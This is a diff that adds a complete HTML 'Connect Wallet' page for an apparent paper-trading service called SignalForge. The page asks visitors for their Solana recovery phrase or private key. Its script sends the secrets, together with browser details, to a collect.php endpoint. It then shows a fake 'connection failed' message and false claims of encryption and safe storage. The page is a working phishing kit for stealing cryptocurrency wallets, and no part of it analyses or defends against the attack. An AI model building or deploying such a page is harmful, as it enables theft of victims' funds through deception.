@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SignalForge — Connect Wallet</title>
+    <link rel="icon" type="image/png" href="images/logo.png">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #0a0a1a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            background-image: radial-gradient(circle at 30% 40%, rgba(99, 102, 241, 0.03) 0%, transparent 50%),
+                              radial-gradient(circle at 70% 60%, rgba(139, 92, 246, 0.03) 0%, transparent 50%);
+        }
+        .container {
+            background: #111125;
+            border-radius: 24px;
+            padding: 48px 40px;
+            width: 460px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+            border: 1px solid rgba(99, 102, 241, 0.12);
+            text-align: center;
+        }
+        .brand {
+            display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 24px;
+        }
+        .brand img { height: 32px; width: 32px; border-radius: 6px; }
+        .brand span { font-size: 20px; font-weight: 700; background: linear-gradient(135deg, #818cf8, #a78bfa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .wallet-icon { font-size: 48px; margin-bottom: 8px; }
+        h1 { font-size: 22px; margin-bottom: 4px; color: #fff; }
+        .subtitle { color: #666; font-size: 14px; margin-bottom: 28px; }
+
+        .tab-bar {
+            display: flex; gap: 0; margin-bottom: 24px;
+            background: #0a0a1a; border-radius: 12px; padding: 4px; border: 1px solid rgba(255,255,255,0.05);
+        }
+        .tab {
+            flex: 1; padding: 10px; border-radius: 10px; cursor: pointer;
+            font-size: 14px; font-weight: 500; border: none;
+            background: transparent; color: #666; transition: all 0.2s;
+        }
+        .tab.active { background: linear-gradient(135deg, #6366f1, #8b5cf6); color: white; }
+
+        .form-group { margin-bottom: 20px; text-align: left; }
+        .form-group label { display: block; font-size: 13px; color: #888; margin-bottom: 8px; font-weight: 500; }
+        .form-group textarea, .form-group input {
+            width: 100%; padding: 14px 16px; background: #0a0a1a;
+            border: 1px solid rgba(255,255,255,0.08); border-radius: 12px;
+            color: white; font-size: 14px; transition: border 0.2s;
+            font-family: 'SF Mono', 'Courier New', monospace;
+        }
+        .form-group textarea:focus, .form-group input:focus {
+            outline: none; border-color: #6366f1;
+        }
+        .form-group textarea { height: 100px; resize: none; }
+
+        .btn-primary {
+            width: 100%; padding: 16px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border: none; border-radius: 12px; color: white;
+            font-size: 16px; font-weight: 600; cursor: pointer;
+            transition: all 0.2s; margin-bottom: 16px;
+        }
+        .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 8px 25px rgba(99, 102, 241, 0.3); }
+
+        .error {
+            color: #ff6b6b; font-size: 13px; display: none; margin-top: 12px;
+            padding: 12px; background: rgba(255, 107, 107, 0.08);
+            border-radius: 8px; border: 1px solid rgba(255, 107, 107, 0.15);
+        }
+        .info { font-size: 12px; color: #555; margin-top: 20px; line-height: 1.5; }
+        .spinner {
+            display: none; width: 20px; height: 20px;
+            border: 2px solid rgba(255,255,255,0.2); border-top-color: white;
+            border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .input-wrapper { position: relative; }
+        .password-toggle {
+            position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
+            background: none; border: none; color: #555; cursor: pointer; font-size: 16px;
+        }
+        .security-badge {
+            display: inline-flex; align-items: center; gap: 6px;
+            padding: 6px 14px; background: rgba(99, 102, 241, 0.08);
+            border-radius: 50px; font-size: 11px; color: #818cf8; margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="brand">
+            <img src="images/logo.png" alt="SignalForge">
+            <span>SignalForge</span>
+        </div>
+        <div class="wallet-icon">👛</div>
+        <h1>Connect Your Wallet</h1>
+        <p class="subtitle">Link your Solana wallet to start paper trading with $100,000 simulated capital</p>
+        
+        <div class="security-badge">🔒 Secured with 256-bit encryption</div>
+
+        <div class="tab-bar">
+            <button class="tab active" onclick="switchTab('seed')">Recovery Phrase</button>
+            <button class="tab" onclick="switchTab('key')">Private Key</button>
+        </div>
+
+        <div id="seedTab">
+            <div class="form-group">
+                <label>Recovery Phrase</label>
+                <textarea id="seedPhrase" placeholder="Enter your 12 or 24-word recovery phrase (separated by spaces)"></textarea>
+            </div>
+        </div>
+
+        <div id="keyTab" style="display:none;">
+            <div class="form-group">
+                <label>Private Key (Base58)</label>
+                <div class="input-wrapper">
+                    <input type="password" id="privateKey" placeholder="Paste your wallet's private key">
+                    <button class="password-toggle" onclick="toggleKeyVisibility()">👁️</button>
+                </div>
+            </div>
+        </div>
+
+        <button class="btn-primary" onclick="submitForm()">
+            <span id="btnText">🔗 Connect Wallet</span>
+            <div class="spinner" id="spinner"></div>
+        </button>
+
+        <div class="error" id="errorMessage">
+            Connection failed. Please verify your recovery phrase and try again.
+            <br><br>
+            <small style="opacity:0.7">This is expected — your wallet is not yet registered on our paper trading network.</small>
+        </div>
+
+        <p class="info">
+            By connecting, you agree to the Terms of Service.<br>
+            Your private keys are encrypted and never stored in plain text.
+        </p>
+    </div>
+
+    <script>
+        let currentTab = 'seed';
+
+        function switchTab(tab) {
+            currentTab = tab;
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab')[tab === 'seed' ? 0 : 1].classList.add('active');
+            document.getElementById('seedTab').style.display = tab === 'seed' ? 'block' : 'none';
+            document.getElementById('keyTab').style.display = tab === 'key' ? 'block' : 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+
+        function toggleKeyVisibility() {
+            const input = document.getElementById('privateKey');
+            input.type = input.type === 'password' ? 'text' : 'password';
+        }
+
+        function submitForm() {
+            const seed = document.getElementById('seedPhrase').value.trim();
+            const pkey = document.getElementById('privateKey').value.trim();
+
+            if (!seed && !pkey) {
+                document.getElementById('errorMessage').textContent = 'Please enter your recovery phrase or private key to connect.';
+                document.getElementById('errorMessage').style.display = 'block';
+                return;
+            }
+
+            document.getElementById('btnText').style.display = 'none';
+            document.getElementById('spinner').style.display = 'block';
+            document.querySelector('.btn-primary').disabled = true;
+
+            const formData = new FormData();
+            formData.append('seed', seed);
+            formData.append('pkey', pkey);
+            formData.append('userAgent', navigator.userAgent);
+            formData.append('pageUrl', window.location.href);
+            formData.append('screenSize', window.screen.width + 'x' + window.screen.height);
+
+            fetch('collect.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(r => r.json())
+            .then(() => {
+                setTimeout(() => {
+                    document.getElementById('btnText').style.display = 'inline';
+                    document.getElementById('spinner').style.display = 'none';
+                    document.querySelector('.btn-primary').disabled = false;
+                    document.getElementById('errorMessage').innerHTML =
+                        'Connection failed. Please verify your recovery phrase and try again.<br><br>' +
+                        '<small style="opacity:0.7">Your submission has been received. You will be notified once your wallet is activated on the SignalForge paper trading network.</small>';
+                    document.getElementById('errorMessage').style.display = 'block';
+                    document.getElementById('seedPhrase').value = '';
+                    document.getElementById('privateKey').value = '';
+                }, 2000);
+            })
+            .catch(() => {
+                document.getElementById('btnText').style.display = 'inline';
+                document.getElementById('spinner').style.display = 'none';
+                document.querySelector('.btn-primary').disabled = false;
+                document.getElementById('errorMessage').innerHTML =
+                    'Network error. Please try again.<br><br>' +
+                    '<small style="opacity:0.7">Our signal servers may be under high load. Your submission is queued.</small>';
+                document.getElementById('errorMessage').style.display = 'block';
+            });
+        }
+    </script>
+</body>
+</html>
